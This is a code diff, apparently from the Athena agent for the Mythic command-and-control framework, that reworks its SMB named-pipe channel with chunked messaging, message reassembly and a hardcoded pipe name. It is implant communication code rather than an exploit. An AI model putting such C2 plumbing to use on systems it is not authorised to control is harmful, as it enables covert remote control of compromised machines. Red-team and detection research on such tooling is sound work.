@@ -2,11 +2,13 @@
 using Athena.Utilities;
 using Newtonsoft.Json;
 using System;
+using System.Linq;
 using System.Collections.Concurrent;
 using System.Threading.Tasks;
 using H.Pipes;
 using H.Pipes.Args;
 using System.Threading;
+using System.Collections.Generic;
 
 namespace Athena.Config
 {
@@ -36,15 +38,16 @@ namespace Athena.Config
     public class Smb
     {
         public string psk { get; set; }
-        private PipeServer<string> serverPipe { get; set; }
-        public string pipeName = "pipename";
+        private PipeServer<DelegateMessage> serverPipe { get; set; }
+        public string pipeName = "scottie_pipe";
         private bool connected { get; set; }
         public bool encrypted { get; set; }
-        public bool encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
+        public bool encryptedExchangeCheck = bool.Parse("false");
         public PSKCrypto crypt { get; set; }
         public BlockingCollection<DelegateMessage> queueIn { get; set; }
         private ManualResetEvent onEventHappenedSignal = new ManualResetEvent(false);
         private ManualResetEvent onClientConnectedSignal = new ManualResetEvent(false);
+        private ConcurrentDictionary<string, string> partialMessages = new ConcurrentDictionary<string, string>();
 
         public Smb(string uuid, MythicConfig config)
         {
@@ -56,31 +59,51 @@ namespace Athena.Config
                 this.crypt = new PSKCrypto(uuid, this.psk);
                 this.encrypted = true;
             }
-            this.serverPipe = new PipeServer<string>(this.pipeName);
+            this.serverPipe = new PipeServer<DelegateMessage>(this.pipeName);
             this.serverPipe.ClientConnected += async (o, args) => await OnClientConnection();
             this.serverPipe.ClientDisconnected += async (o, args) => await OnClientDisconnect();
             this.serverPipe.MessageReceived += (sender, args) => OnMessageReceive(args);
             this.serverPipe.StartAsync();
         }
 
-        private async void OnMessageReceive(ConnectionMessageEventArgs<string> args)
+        private async void OnMessageReceive(ConnectionMessageEventArgs<DelegateMessage> args)
         {
             try
             {
                 //Add message to out queue.
-                DelegateMessage dm = JsonConvert.DeserializeObject<DelegateMessage>(args.Message);
-                this.queueIn.Add(dm);
-            }
-            catch
-            {
-                DelegateMessage dm = new DelegateMessage()
+                if (this.partialMessages.ContainsKey(args.Message.uuid))
                 {
-                    c2_profile = "smb",
-                    uuid = "",
-                    message = ""
-                };
+                    if (args.Message.final) {
+                        string curMessage = args.Message.message;
+
+                        args.Message.message = this.partialMessages[args.Message.uuid] + curMessage;
+                        this.queueIn.Add(args.Message);
+
+                        this.partialMessages.Remove(args.Message.uuid, out _);
+                        onEventHappenedSignal.Set(); //Indicate something happened
+                    }
+                    else //Not Last Message but we already have a value in the partial messages
+                    {
+                        this.partialMessages[args.Message.uuid] += args.Message.message;
+                    }
+                }
+                else //First time we've seen this message
+                {
+                    if (args.Message.final)
+                    {
+                        this.queueIn.Add(args.Message);
+                        onEventHappenedSignal.Set(); //Indicate something happened
+                    }
+                    else
+                    {
+                        this.partialMessages.GetOrAdd(args.Message.uuid, args.Message.message); //Add value to our Collection
+                    }
+                }
             }
-            onEventHappenedSignal.Set(); //Indicate something happened
+            catch (Exception e)
+            {
+                Console.WriteLine(e);
+            }
         }
 
         public async Task OnClientConnection()
@@ -94,6 +117,7 @@ namespace Athena.Config
             this.connected = false;
             onEventHappenedSignal.Set(); //Indicate something happened
             onClientConnectedSignal.Reset();
+            this.partialMessages.Clear();
         }
 
         //Send, wait for a response, and return it to the main functions
@@ -113,23 +137,40 @@ namespace Athena.Config
                 }
                 else
                 {
-                    json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
+                    json = await Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
                 }
 
-                //Submit our message to the mythic server and wait for a response
-                DelegateMessage dm = new DelegateMessage()
-                {
-                    uuid = Globals.mc.MythicConfig.uuid,
-                    message = json,
-                    c2_profile = "smb"
-                };
+                DelegateMessage dm;
 
-                await this.serverPipe.WriteAsync(JsonConvert.SerializeObject(dm)); //Write our output
+                IEnumerable<string> parts = json.SplitByLength(50000);
+
+                foreach(string part in parts)
+                {
+                    if(part == parts.Last())
+                    {
+                        dm = new DelegateMessage()
+                        {
+                            uuid = Globals.mc.MythicConfig.uuid,
+                            message = part,
+                            c2_profile = "smb",
+                            final = true
+                        };
+                    }
+                    else
+                    {
+                        dm = new DelegateMessage()
+                        {
+                            uuid = Globals.mc.MythicConfig.uuid,
+                            message = part,
+                            c2_profile = "smb",
+                            final = false
+                        };
+                    }
+                    await this.serverPipe.WriteAsync(dm);
+                }
 
                 //Wait for a signal
-
                 onEventHappenedSignal.WaitOne();
-
                 if (!connected) //Our event was a client disconnect
                 {
                     onEventHappenedSignal.Reset(); //Reset the event and return empty
@@ -149,7 +190,7 @@ namespace Athena.Config
                         }
                         else
                         {
-                            return Misc.Base64Decode(dm.message).Substring(36);
+                            return (await Misc.Base64Decode(dm.message)).Substring(36);
                         }
                     }
                     else
@@ -158,8 +199,9 @@ namespace Athena.Config
                     }
                 }
             }
-            catch
+            catch (Exception e)
             {
+                Console.WriteLine(e);
                 this.connected = false;
                 return "";
             }
